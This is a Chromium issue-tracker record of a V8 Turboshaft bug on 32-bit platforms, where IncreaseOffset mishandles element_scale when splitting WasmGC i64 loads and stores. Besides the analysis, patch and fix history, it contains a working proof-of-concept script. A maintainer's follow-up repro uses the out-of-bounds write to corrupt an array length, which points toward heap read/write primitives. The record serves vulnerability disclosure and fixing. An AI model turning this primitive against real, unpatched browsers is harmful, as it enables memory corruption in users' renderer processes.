# V8: Incorrect Address Computation in Int64LoweringReducer via IncreaseOffset element_scale Mishandling

| Field | Value |
|-------|-------|
| **Issue ID** | [502030575](https://issues.chromium.org/issues/502030575) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Turboshaft, Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ca...@gmail.com |
| **Assignee** | ml...@chromium.org |
| **Created** | 2026-04-13 |
| **Bounty** | $8,000.00 |

## Description

## Summary

A bug in Turboshaft's `Int64LoweringReducer::IncreaseOffset` on 32-bit platforms (ia32, ARM) causes incorrect address computation when splitting 64-bit loads into two 32-bit loads. When `element_scale > 0` and the offset+4 wraps to `INT32_MIN` for tagged-base loads, the fallback path adds 4 to the **index** instead of the offset — but the `element_scale` is still applied to the modified index, causing the high word to be loaded from `base + (index+4)*scale + offset` instead of `base + index*scale + offset + 4`. For i64 arrays (`element_scale=3`), this creates a **28-byte address error** (`4*8 - 4 = 28`), reading the high word from adjacent heap memory past the WasmGC array.

**NOTE: I'm reporting this as Type:Bug because 1) I cannot change the address offset (only offset of 28 is possible), 2) load/store occurs in benign area, and 3) WASM memory is anyway guarded by guard pages.**

## Bug

### Summary

The `IncreaseOffset` function in `Int64LoweringReducer` does not account for `element_scale` when falling back to adding the offset increment to the index. When `MachineOptimizationReducer` folds a large constant from an `i32.add` index computation into the Load offset (reaching `INT32_MAX - 3`), the subsequent `IncreaseOffset(offset, 4)` call for the high-word load overflows to `INT32_MIN`, which is invalid for tagged-base loads. The fallback adds 4 to the index, but since `element_scale=3` is still applied, the high word is loaded from an address 28 bytes too far. The same bug also affects the `REDUCE(Store)` path (line 363-406), which uses the same `IncreaseOffset` function to split 64-bit stores.

### Detail

The bug exists in the interaction between `MachineOptimizationReducer` (constant folding) and `Int64LoweringReducer` (64-bit to 32-bit splitting):

**Step 1: WasmLoweringReducer emits Load with element\_scale=3**

WasmGC `array.get` on an `i64` array is lowered to a `Load` with `element_scale = value_kind_size_log2(i64) = 3` and `offset = WasmArray::kHeaderSize = 12`:

```
// src/compiler/turboshaft/wasm-lowering-reducer.h:358
return __ Load(array, __ ChangeInt32ToIntPtr(index), load_kind,
               RepresentationFor(array_type->element_type(), is_signed),
               WasmArray::kHeaderSize,                              // offset = 12
               array_type->element_type().value_kind_size_log2());  // element_scale = 3

```

**Step 2: MachineOptimizationReducer folds constants into the offset**

```
// src/compiler/turboshaft/machine-optimization-reducer.h:2732-2744
} else if (const WordBinopOp* binary_op =
               index_op.TryCast<WordBinopOp>()) {
  if (binary_op->kind == WordBinopOp::Kind::kAdd &&
      TryAdjustOffset(offset, matcher_.Get(binary_op->right()),
                      *element_scale, tagged_base)) {
    index = binary_op->left();
    continue;  // element_scale is PRESERVED
  }
}

```

When the Wasm code computes `array.get(arr, param + 268435454)`, the constant `268435454` is folded into the offset via `TryAdjustOffset` (line 2646-2670), which multiplies by `1 << element_scale`: `offset = 12 + 268435454 * 8 = 2147483644` (which is `INT32_MAX - 3`). Crucially, **element\_scale remains 3**.

`TryAdjustOffset` validates this new offset passes `LoadOp::OffsetIsValid(2147483644, true)`, which checks `offset >= INT32_MIN + kHeapObjectTag = INT32_MIN + 1` — this succeeds.

**Step 3: Int64LoweringReducer splits the i64 load**

```
// src/compiler/turboshaft/int64-lowering-reducer.h:347-358
if (loaded_rep == MemoryRepresentation::Int64() || ...) {
  auto [high_index, high_offset] =
      IncreaseOffset(index, offset, sizeof(int32_t), kind.tagged_base);
  return __ MakeTuple(
      Next::ReduceLoad(base, index, kind, ..., offset, element_scale),
      Next::ReduceLoad(base, high_index, kind, ..., high_offset, element_scale));
      //                                                         ^^^^^^^^^^^^^ BUG
}

```

**Step 4: IncreaseOffset triggers the fallback**

```
// src/compiler/turboshaft/int64-lowering-reducer.h:297-320
std::pair<OptionalV<Word32>, int32_t> IncreaseOffset(OptionalV<Word32> index,
                                                     int32_t offset,
                                                     int32_t add_offset,
                                                     bool tagged_base) {
  int32_t new_offset =
      static_cast<uint32_t>(offset) + static_cast<uint32_t>(add_offset);
  // new_offset = 2147483644 + 4 = 2147483648 → wraps to INT32_MIN as int32_t
  OptionalV<Word32> new_index = index;
  if (!LoadOp::OffsetIsValid(new_offset, tagged_base)) {
    // INT32_MIN < INT32_MIN + 1 → invalid for tagged loads
    new_offset = offset;  // keep original offset
    if (index.has_value()) {
      new_index = __ Word32Add(new_index.value(), add_offset);
      // Adds 4 to the INDEX — but element_scale=3 will be applied later!
    }
  }
  return {new_index, new_offset};
}

```

`IncreaseOffset` is unaware of `element_scale`. When it adds 4 to the index, the subsequent Load applies `element_scale=3`, making the effective byte offset `4 * 8 = 32` instead of the intended `4`.

**Address computation:**

- **Low word** (correct): `base + index*8 + 2147483644`
- **High word** (buggy): `base + (index+4)*8 + 2147483644` = `base + index*8 + 32 + 2147483644`
- **High word** (correct): `base + index*8 + 2147483644 + 4`
- **Error**: `32 - 4 = 28 bytes`

### Trigger Conditions

1. **32-bit platform** (ia32 or ARM) — `Int64LoweringReducer` only runs on 32-bit
2. **WasmGC i64 array** — `element_scale=3` and `tagged_base=true`
3. **Array index computed as `Add(variable, large_constant)`** — enables partial constant folding (the constant is folded into the offset while the variable remains as the index with `element_scale` preserved)
4. **Constant value of exactly `(INT32_MAX - 3 - kHeaderSize) / 8 = 268435454`** — produces offset `INT32_MAX - 3`, so adding 4 wraps to `INT32_MIN`
5. **Function compiled with Turboshaft** (occurs through tier-up after ~40K calls, or immediately with `--no-liftoff`)

## Version

### Reproduced Version

- `main` branch latest commit (2026/04/13): `3daaa64319f`
- V8 14.9.0

### Bisect

The bug was introduced by the following commit, which added the `IncreaseOffset` function to handle offset overflow when splitting 64-bit loads:

```
commit e4e12c9ebff42aaf1fd6725396d132ae058fd8c6
Author: Matthias Liedtke <mliedtke@chromium.org>
Date:   Thu Jun 13 12:45:48 2024 +0200

    [wasm][turboshaft] Fix Load offset overflow in Int64Lowering

    Same as https://crrev.com/c/5608453 but for the LoadOp.
    The offset may be any value excluding int32 min for tagged loads.

    Fixed: 346505953
    Bug: 344014332
    Change-Id: I716e578d1ccd659203b1c739e77b56e3cb2bd4b0
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5626025
    Cr-Commit-Position: refs/heads/main@{#94430}

```

This commit was intended to fix a different offset overflow issue (crbug 346505953) but introduced this new bug: the `IncreaseOffset` fallback path does not account for `element_scale` when adding to the index. The existing regression test (`test/mjsunit/regress/wasm/regress-346505953.js`) only tests that an out-of-bounds access traps — it does not test the fallback path with a variable index and `element_scale > 0`.

## Reproduction Case

Two versions are provided: Version 1 uses `--no-liftoff` for instant reproduction; Version 2 triggers through natural tier-up (no special flags).

### Release Build

Version 1 (with `--no-liftoff`):

```
out/ia32.release/d8 --no-liftoff poc.js

```

Result (ia32 release):

```
BUG DETECTED on iteration 0!
Expected: 0x1111111100000001
Got:      0x1
Low word:  0x1
High word: 0x0
High word read from offset 44 — 24 bytes past the 20-byte array end

```

The high word reads from offset 44 while the 1-element array ends at offset 20 (`kHeaderSize + 1*8`), confirming the high word is read from 24 bytes past the array allocation. The value `0x0` is whatever happened to be in adjacent heap memory.

Version 2 (natural tier-up, no flags):

```
out/ia32.release/d8 poc.js

```

Result (ia32 release):

```
BUG DETECTED on iteration 52252!
Expected: 0x1111111100000001
Got:      0x100000001
Low word:  0x1
High word: 0x1
High word read from offset 44 — 24 bytes past the 20-byte array end

```

Result (ARM release, with `--no-liftoff`):

```
BUG DETECTED on iteration 35795!
Expected: 0x1111111100000001
Got:      0x1
Low word:  0x1
High word: 0x0
High word read from offset 44 — 24 bytes past the 20-byte array end

```

On x64, the bug does NOT reproduce (Int64LoweringReducer does not run on 64-bit platforms):

```
out/x64.release/d8 --no-liftoff poc.js
# Output: No bug detected (function may not have tiered up to Turboshaft)

```
### Debug Build

```
out/ia32.debug/d8 --no-liftoff poc.js

```

Result (ia32 debug):

```
BUG DETECTED on iteration 0!
Expected: 0x1111111100000001
Got:      0x-21524110ffffffff
Low word:  0x1
High word: 0xdeadbeef
High word read from offset 44 — 24 bytes past the 20-byte array end

```

The leaked high word `0xdeadbeef` is V8's debug zap value for uninitialized/freed memory, confirming the read reached into adjacent uninitialized heap memory.

Note: No DCHECK fires for this bug because the inputs to `IncreaseOffset` are individually valid — the error is semantic (element\_scale is not considered), not a simple bounds violation.

### PoC Code

```
// PoC: Int64LoweringReducer IncreaseOffset incorrect address computation
// Affects: 32-bit platforms (ia32, ARM) when compiled with Turboshaft
// Bug: High word of i64 loaded from wrong address (28 bytes off)
//
// Run with: out/ia32.release/d8 --no-liftoff poc.js
//       or: out/ia32.release/d8 poc.js  (triggers via natural tier-up)

d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

let builder = new WasmModuleBuilder();
let array_type = builder.addArray(kWasmI64);

// This constant causes MachineOptimizationReducer to fold it into the Load offset:
// offset = kHeaderSize + BIG_CONST * 8 = 12 + 268435454*8 = 2147483644 = INT32_MAX-3
// Adding 4 for the high word wraps to INT32_MIN, triggering the IncreaseOffset bug
const BIG_CONST = 268435454;

builder.addFunction("test", makeSig([kWasmI32], [kWasmI64]))
  .addLocals(wasmRefNullType(array_type), 1)
  .addBody([
    // Create array of 1 i64 element (20 bytes total).
    // Correct high word: offset 16 (within array).
    // Buggy high word:   offset 44 (24 bytes PAST array end).
    ...wasmI32Const(1),
    kGCPrefix, kExprArrayNewDefault, array_type,
    kExprLocalSet, 1,

    // Set element 0 = 0x1111111100000001 (low=0x00000001, high=0x11111111)
    kExprLocalGet, 1,
    ...wasmI32Const(0),
    ...wasmI64Const(0x1111111100000001n),
    kGCPrefix, kExprArraySet, array_type,

    // Read element at index (param + BIG_CONST)
    // When param=-BIG_CONST, effective index=0, bounds check passes
    // But high word is read from offset 44 — 24 bytes past the array end
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    ...wasmI32Const(BIG_CONST),
    kExprI32Add,
    kGCPrefix, kExprArrayGet, array_type,
  ])
  .exportFunc();

let instance = builder.instantiate();

let expected = 0x1111111100000001n;
let bugDetected = false;

// Call enough times to trigger tier-up to Turboshaft
for (let i = 0; i < 100000; i++) {
  let result = instance.exports.test(-BIG_CONST);
  if (result !== expected) {
    print("BUG DETECTED on iteration " + i + "!");
    print("Expected: 0x" + expected.toString(16));
    print("Got:      0x" + result.toString(16));
    print("Low word:  0x" + (result & 0xFFFFFFFFn).toString(16));
    print("High word: 0x" + ((result >> 32n) & 0xFFFFFFFFn).toString(16));
    print("High word read from offset 44 — 24 bytes past the 20-byte array end");
    bugDetected = true;
    break;
  }
}

if (!bugDetected) {
  print("No bug detected (function may not have tiered up to Turboshaft)");
}

```
## Suggested Patch

### File: src/compiler/turboshaft/int64-lowering-reducer.h

```
@@ -347,6 +347,13 @@
     if (loaded_rep == MemoryRepresentation::Int64() ||
         loaded_rep == MemoryRepresentation::Uint64()) {
+      // When element_scale > 0, fold it into the index before splitting.
+      // IncreaseOffset adds to the index on fallback, but the element_scale
+      // would still be applied, causing an incorrect address for the high word.
+      if (element_scale > 0 && index.has_value()) {
+        index = __ Word32ShiftLeft(index.value(), element_scale);
+        element_scale = 0;
+      }
       auto [high_index, high_offset] =
           IncreaseOffset(index, offset, sizeof(int32_t), kind.tagged_base);
       return __ MakeTuple(

```

The fix normalizes `element_scale` to 0 by folding the shift into the index **before** splitting the 64-bit load. This ensures `IncreaseOffset`'s fallback path (adding to the index) produces a correct byte-level offset of +4, regardless of whether the offset increment goes to the offset field or the index. The atomic code paths (lines 326-338) already correctly pre-fold `element_scale` in the same way. The same fix should be applied to the `REDUCE(Store)` handler (line 388-400) which has the identical bug.

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 2.4 KB)

## Timeline

### ml...@chromium.org (2026-04-13)

I haven't verified any of this, yet, but it sounds plausible.

I agree that in general it doesn't matter "how much" we are out of bounds as long as the bounds check works correctly (which happens before the load/store here, 32 bit platforms don't use implicit bounds checks via signals).
I wonder if we even need to do anything smart, changing `IncreaseOffset` to emit an `__ Unreachable()` should be enough to solve the issue and it would also sound reasonably safe.

Instead of doing any sophisticated (and potentially broken) calculation, we simply rely on the preceding bounds-check (any load does that anyways) and if it didn't happen properly, then we end up with a stability bug without any security impact for this case.

### ml...@chromium.org (2026-04-13)

Please ignore [comment #2](https://issues.chromium.org/issues/502030575#comment2), I only read the beginning arguing about the offset with loads and assumed these are about linear memory operations that would be out-of-bounds. However, in this case the absurdly high offset is caused in user-space.

So we have `(huge_negative_number + huge_constant)` as the index and now the `MachineOptimizationReducer` folds the `huge_constant` into the offset of the load operation.

This means that the `Int64LoweringReducer` must allow wrap-arounds. If `index * scale + offset` is larger than `uint32_t::max`, then that is fine and not necessarily an out-of-bounds access.

### ml...@chromium.org (2026-04-13)

I took another in-depth look, from my understanding this allows arbitrary in-sandbox corruption on 32 bit platforms.

### ml...@chromium.org (2026-04-13)

Here is my updated repro:

```
// Flags: --no-liftoff --allow-natives-syntax

d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

let builder = new WasmModuleBuilder();
let array_type = builder.addArray(kWasmI64);
let array_i32 = builder.addArray(kWasmI32);

const BIG_CONST = 268435454;

builder.addFunction("test", makeSig([kWasmI32], [kWasmAnyRef, kWasmAnyRef]))
  .addLocals(wasmRefNullType(array_type), 1)
  .addBody([

    // Create an array with size 3.
    ...wasmI32Const(3),
    kGCPrefix, kExprArrayNewDefault, array_type,
    kExprLocalTee, 1,

    // Create an array with size 0.
    // We'll manipulate its size later on.
    ...wasmI32Const(0),
    kGCPrefix, kExprArrayNewDefault, array_i32,

    // Write element at index (param + BIG_CONST)
    // When param=-BIG_CONST, effective index=0, bounds check passes
    // But high word is read from offset 44 — 24 bytes past the array end
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    ...wasmI32Const(BIG_CONST),
    kExprI32Add,
    ...wasmI64Const(123n << 32n),
    kGCPrefix, kExprArraySet, array_type,
  ])
  .exportFunc();

let instance = builder.instantiate();

let expected = 0;

let result = instance.exports.test(-BIG_CONST);
// This is the new array. Its length is 123, the value we just used in our
// array.set. We can pick an arbitrarily large number to have full control for
// anything on the heap following this allocation.
// Using type confusion it should be trivial to get full in-sandbox read-write
// primitives from here.
%DebugPrint(result[1]);

```

See comment above, being able to write out-of-bounds on the heap is all we really need.
The program prints:

```
DebugPrint: 0x285c1fa9: [WasmArray]
 - map: 0x5457a3f1 <Map(WASM_ARRAY_TYPE)>
 - element type: i32
 - length: 123                              // <<----- this is the relevant bit
           0: 989601417
           1: 677125989
           2: 989595629
       3-122: 0

```

I'll create a fix for it tomorrow.

### ch...@google.com (2026-04-14)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### dx...@google.com (2026-04-15)

Project: v8/v8  

Branch:  main  

Author:  Matthias Liedtke [mliedtke@chromium.org](mailto:mliedtke@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7758773>

[wasm] 32 bit platforms: Fix int64 lowering for 'invalid' offsets

---


Expand for full commit details
```
     
    The logic for the case !LoadOp::OffsetIsValid() was not correct. 
     
    Fixed: 502030575 
    Change-Id: I81692e2bb7cc15f85911c0110b84ae3a66189d53 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7758773 
    Auto-Submit: Matthias Liedtke <mliedtke@chromium.org> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106481}

```

---

Files:

- M `src/compiler/turboshaft/int64-lowering-reducer.h`
- A `test/mjsunit/regress/wasm/regress-502030575.js`

---

Hash: [7c165d90f0800b78c92fd0c13690e7b40683026a](https://chromiumdash.appspot.com/commit/7c165d90f0800b78c92fd0c13690e7b40683026a)  

Date: Tue Apr 14 14:31:35 2026


---

### ch...@google.com (2026-04-15)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches (as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels. Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security>
  After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ml...@chromium.org (2026-04-15)

Setting `Found In` to `128` as <https://chromiumdash.appspot.com/commit/e4e12c9ebff42aaf1fd6725396d132ae058fd8c6> touched it and didn't fix this issue. I didn't spend any further time on figuring out when and where it was exactly introduced but probably the change that initially added the int64 lowering to Turboshaft (which was in the beginning behind an experimental flag).

### ch...@google.com (2026-04-15)

**M148** merge request created. **Please update [crbug/502832399](https://crbug.com/502832399) to have this merge reviewed.**

### dx...@google.com (2026-04-15)

Project: v8/v8  

Branch:  refs/branch-heads/14.8  

Author:  Matthias Liedtke [mliedtke@chromium.org](mailto:mliedtke@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7762885>

[M148] [wasm] 32 bit platforms: Fix int64 lowering for 'invalid' offsets

---


Expand for full commit details
```
     
    Original change's description: 
    > [wasm] 32 bit platforms: Fix int64 lowering for 'invalid' offsets 
    > 
    > The logic for the case !LoadOp::OffsetIsValid() was not correct. 
    > 
    > Fixed: 502030575 
    > Change-Id: I81692e2bb7cc15f85911c0110b84ae3a66189d53 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7758773 
    > Auto-Submit: Matthias Liedtke <mliedtke@chromium.org> 
    > Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    > Commit-Queue: Matthias Liedtke <mliedtke@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#106481} 
     
    (cherry picked from commit 7c165d90f0800b78c92fd0c13690e7b40683026a) 
     
    Bug: 502832399,502030575 
    Change-Id: I81692e2bb7cc15f85911c0110b84ae3a66189d53 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7762885 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Commit-Queue: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/14.8@{#6} 
    Cr-Branched-From: f9659283a5f8d42b3c09228cf5df606fcaf47a3d-refs/heads/14.8.178@{#1} 
    Cr-Branched-From: 141232520dc4910401240c531db3af36910a0fd1-refs/heads/main@{#106240}

```

---

Files:

- M `src/compiler/turboshaft/int64-lowering-reducer.h`
- A `test/mjsunit/regress/wasm/regress-502030575.js`

---

Hash: [649b1d7552b03c6641c848092aeb3940cb0df5de](https://chromiumdash.appspot.com/commit/649b1d7552b03c6641c848092aeb3940cb0df5de)  

Date: Tue Apr 14 14:31:35 2026


---

### ch...@google.com (2026-04-16)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2026-04-16)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### sp...@google.com (2026-04-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
Baseline with bisect. Renderer RCE / memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-05-11)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-05-11)

1. <https://chromium-review.git.corp.google.com/c/v8/v8/+/7831805>
2. Low - There was no conflict.
3. 148
4. Yes, the bug was introduced in 2024.

### ch...@google.com (2026-07-23)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/502030575)*
